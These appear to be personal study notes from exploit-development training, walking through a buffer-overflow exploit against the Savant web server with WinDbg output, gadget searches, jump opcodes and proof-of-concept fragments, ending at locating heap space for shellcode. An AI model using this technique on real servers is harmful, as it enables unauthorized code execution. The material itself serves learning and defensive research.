# Procedure



{% code overflow="wrap" %}
```bash
# 1. Run PoC to crash the application
# 2. Analyze the crash
## 1. Only 3 bytes available for shellcode 
dds @esp L5
0472ea2c  00414141 Savant+0x14141
0472ea30  0472ea84
0472ea34  0041703c Savant+0x1703c
0472ea38  01725720
0472ea3c  01725720
## 2. Attempt to increase size of the buffer
## 3. Check if registers point to buffer at time of overflow
## 4. Second byte above points to a memory location very close to the current stack. Viewing this location shows. The initial GET request that is part of the payload. 
0:003> dc poi(esp+4)
0472ea84  00544547 00000000 00000000 00000000  GET.............
0472ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0472eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
# 3. Check for bad characters. Because space is limited may have to comment out some of the bad characters to reduce the size of the payload sometimes it won't crash. Othertimes you won't see all of the bad chars in WinDbg. 
# 4. Gain control of the execution flow. Use a pattern to find the exact offset. If pattern fails to work. If this occurs split buffer into A's & B's to locate it manually. 
# 5. Find an instruction to overwrite the EIP with.
## 1. Load narly and list protections of all loaded modules
.load narly
!nmod
## 2. Savant webserver doesn't have any loaded modules and the address starts with a NULL bytes which could be a problem. 
## 3. Partial EIP overwrite means that we can leverage this to address the NULL byte in the address. 
0:004> dds @esp L4
03f9ea2c  00434343 Savant+0x34343
03f9ea30  03f9ea84
03f9ea34  0041703c Savant+0x1703c
03f9ea38  01855758
## 4. Update PoC to only overwrite the lower 3 bytes of the EIP register. Run to confirm partial EIP overwrite is possible. 
  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  inputBuffer+= b"\x42\x42\x42" 
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
## 5. At time of crash the second DWord on the stack points very close to the stack pointer. 
0:004> dds @esp L5
03feea2c  03fefe70
03feea30  03feea84
03feea34  0041703c Savant+0x1703c
03feea38  01965758
03feea3c  01965758
0:004> dc poi(@esp+0x04)
03feea84  00544547 00000000 00000000 00000000  GET.............
03feea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
03feeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03feeab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03feeac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03feead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03feeae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03feeaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
## 6. Find a way to redirect to this data. An instruction sequence like pop eax, ret. Should remove the first value from the stack then return us to the value that points to the GET request. Run msf-nasm_shell to get the op codes for the pop eax, ret sequence. 
❯ msf-nasm_shell
nasm > pop eax
00000000  58                pop eax
nasm > ret
00000000  C3                ret
nasm >
## 7. Search for the sequence in WinDbg. 
0:004> lm m Savant
Browse full module list
start    end        module name
00400000 00452000   Savant   C (no symbols)           
0:004> s -[1]b 00400000 00452000 58 c3
0x00418674
0x0041924f
## 8. Update the PoC to point overwrite the EIP to jump to this newly found address. Before running it however set a breakpoint to the address listed below. 
  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
## 9. After single stepping through after the return. We can see we landed at the correct place. While the first few instructions generated by the GET portion of the payload may not cause any issue it is not very clean. 
Breakpoint 0 hit
eax=00000000 ebx=016b5758 ecx=0000000e edx=77841670 esi=016b5758 edi=0041703c
eip=00418674 esp=0402ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18674:
00418674 58              pop     eax
0:004> t
eax=0402fe70 ebx=016b5758 ecx=0000000e edx=77841670 esi=016b5758 edi=0041703c
eip=00418675 esp=0402ea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18675:
00418675 c3              ret
0:004> t
eax=0402fe70 ebx=016b5758 ecx=0000000e edx=77841670 esi=016b5758 edi=0041703c
eip=0402ea84 esp=0402ea34 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
0402ea84 47              inc     edi
0:004> u @eip
0402ea84 47              inc     edi
0402ea85 45              inc     ebp
0402ea86 54              push    esp
0402ea87 0000            add     byte ptr [eax],al
0402ea89 0000            add     byte ptr [eax],al
0402ea8b 0000            add     byte ptr [eax],al
0402ea8d 0000            add     byte ptr [eax],al
0402ea8f 0000            add     byte ptr [eax],al
0:004> dc @eip
0402ea84  00544547 00000000 00000000 00000000  GET.............
0402ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0402eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0402eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0402eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0402ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0402eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0402eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
## 10. Rerun the PoC again, setting the same breakpoint as before and stop right before the return instruction. 
bp 0x00418674
g
<Send Payload> 
0:004> t
eax=0417fe70 ebx=019c5758 ecx=0000000e edx=77841670 esi=019c5758 edi=0041703c
eip=00418675 esp=0417ea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18675:
00418675 c3              ret
0:004> dc poi(@esp)
0417ea84  00544547 00000000 00000000 00000000  GET.............
0417ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0417eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0417eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0417eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0417ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0417eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0417eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
## 11. The size of the HTTP Method field seems very large and may not have accurate checks. This will be verified. Update the PoC as below. 
  httpMethod = b"\x43\x43\x43\x43\x43\x43\x43\x43" + b" /"
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"
## 12. Set the breakpoint as earlier. The rerun the PoC. The GET method has been overwritten with arbitrary bytes. 
bp 0x00418674
g
0:004> dc poi(@esp+4)
03feea84  43434343 43434343 00000000 00000000  CCCCCCCC........
03feea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
03feeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
## 13. Now to update the HTTP method with a short jump of 17 bytes. 
httpMethod = b"\xeb\x17\x90\x90" + b" /" # Short jump of 0x17
## 14. Before running the PoC set a breakpoint at the pop eax; ret instruction sequence. Rerun the PoC then single step through to verify it lands at the correct memory address. 
bp 0x00418674
g
t
t
db @eip L2
0:004> u @eip
03fcea84 cb              retf
03fcea85 17              pop     ss
## 15. Output shows that instead of the jmp instruction we get an unexpected RET instruction. Got cb instead of eb. It's possible that this memory allocation has different bad chars. An alternative could be a conditional jump je (Jump if equal). First use a XOR ECX, ECX then TEST ECX, ECX this will set the ZF to 1. Use msf-nasm_shell to get the op codes. 
❯ msf-nasm_shell
nasm > xor ecx, ecx
00000000  31C9              xor ecx,ecx
nasm > test ecx, ecx
00000000  85C9              test ecx,ecx
nasm > je 0x17
00000000  0F8411000000      jz near 0x17
## 16. Update the PoC to include the new changes. Before running the PoC set the breakpoint again. Then single step through the instructions. 
httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /" # xor ecx, ecx; test ecx, ecx; 
bp 0x00418674
t
## 17. Before executing the ret command. Use the unassemble command to display the next 3 commands to be executed. To confirm that the op codes have not been mangled. 
0:004> u poi(@esp) L3
03f1ea84 31c9            xor     ecx,ecx
03f1ea86 85c9            test    ecx,ecx
03f1ea88 0f8411000000    je      03f1ea9f
## 18. Single step through the test & xor instructions. 
0:004> t
eax=03f1fe70 ebx=017c5758 ecx=0000000e edx=77841670 esi=017c5758 edi=0041703c
eip=03f1ea84 esp=03f1ea34 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
03f1ea84 31c9            xor     ecx,ecx
0:004> t
eax=03f1fe70 ebx=017c5758 ecx=00000000 edx=77841670 esi=017c5758 edi=0041703c
eip=03f1ea86 esp=03f1ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
03f1ea86 85c9            test    ecx,ecx
0:004> t
eax=03f1fe70 ebx=017c5758 ecx=00000000 edx=77841670 esi=017c5758 edi=0041703c
eip=03f1ea88 esp=03f1ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
03f1ea88 0f8411000000    je      03f1ea9f 
## 19. Before executing the jump. Verify that the ZF has been set. Also check the destination of the jump. 
r @zf
0:004> dd 03f1ea9f -4
03f1ea9b  41412f00 41414141 41414141 41414141
03f1eaab  41414141 41414141 41414141 41414141
03f1eabb  41414141 41414141 41414141 41414141
## 20. This shows that we will land 2 bytes into the destination. Step into the jump to confirm. 
0:004> t
eax=03f1fe70 ebx=017c5758 ecx=00000000 edx=77841670 esi=017c5758 edi=0041703c
eip=03f1ea9f esp=03f1ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
03f1ea9f 41              inc     ecx
0:004> u @eip
03f1ea9f 41              inc     ecx
03f1eaa0 41              inc     ecx
03f1eaa1 41              inc     ecx
03f1eaa2 41              inc     ecx
03f1eaa3 41              inc     ecx
03f1eaa4 41              inc     ecx
03f1eaa5 41              inc     ecx
03f1eaa6 41              inc     ecx
## 21. Check the available shellcode space by using the below command. Take the address in the bottom line of shellcode (03f1eb8f) on this line there is 11 bytes so add (+0n11) then subtract this from the EIP to find the available space. 
0:004> db @eip L100
03f1ea9f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eaaf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eabf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eacf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eadf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eaef  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eaff  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eb0f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eb1f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eb2f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eb3f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eb4f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eb5f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eb6f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eb7f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
03f1eb8f  41 41 41 41 41 41 41 41-41 41 41 74 86 41 00 00  AAAAAAAAAAAt.A..
0:004> ? 03f1ea9f  +0n11 -@eip
Evaluate expression: 11 = 0000000b
0:004> 03f1eb8f +0n11 - @eip
       ^ Syntax error in '03f1eb8f +0n11 - @eip'
0:004> ? 03f1eb8f +0n11 - @eip
Evaluate expression: 251 = 000000fb
## 22. Rerun the application and attach WinDbg. Set the same breakpoint as earlier and resume execution. 
bp 0x00418674
g
# 6. Find alternative location to store the shellcode. 
## 1. Modify the PoC as below and rerun
httpEndRequest = b"\r\n\r\n"
shellcode = b"w00tw00t" + b"\x44" * 400
buf = httpMethod + inputBuffer + httpEndRequest + shellcode
## 2. Once the breakpoint has been hit. Search for the new shellcode. 
Breakpoint 0 hit
eax=00000000 ebx=001f5758 ecx=0000000e edx=77841670 esi=001f5758 edi=0041703c
eip=00418674 esp=03faea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18674:
00418674 58              pop     eax
0:004> s -a 0x0 L?80000000 w00tw00t
001f5b0e  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD
0:004> db 001f5b0e + 0n408 - 4 L4
001f5ca2  44 44 44 44 
## 3. Inspecting the !teb shows us that the memory location is not on the current stack. Stack is between 03fac000 & 03fb0000. Memory address is 001f5ca2
001f5ca2  44 44 44 44                                      DDDD
0:004> !teb
TEB at 00238000
    ExceptionList:        03faff70
    StackBase:            03fb0000
    StackLimit:           03fac000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00238000
    EnvironmentPointer:   00000000
    ClientId:             00001b60 . 000014e0
    RpcHandle:            00000000
    Tls Storage:          00635e30
    PEB Address:          00233000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0
## 4. Locate the memory location. It appears to be on the heap. 
!address 001f5b0e
Usage:                  Heap
Base Address:           001f0000
End Address:            001ff000
Region Size:            0000f000 (  60.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        001f0000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              heap owning the address: !heap 0x1f0000
More info:              heap segment
More info:              heap entry containing the address: !heap -x 0x1f5b0e

```
{% endcode %}
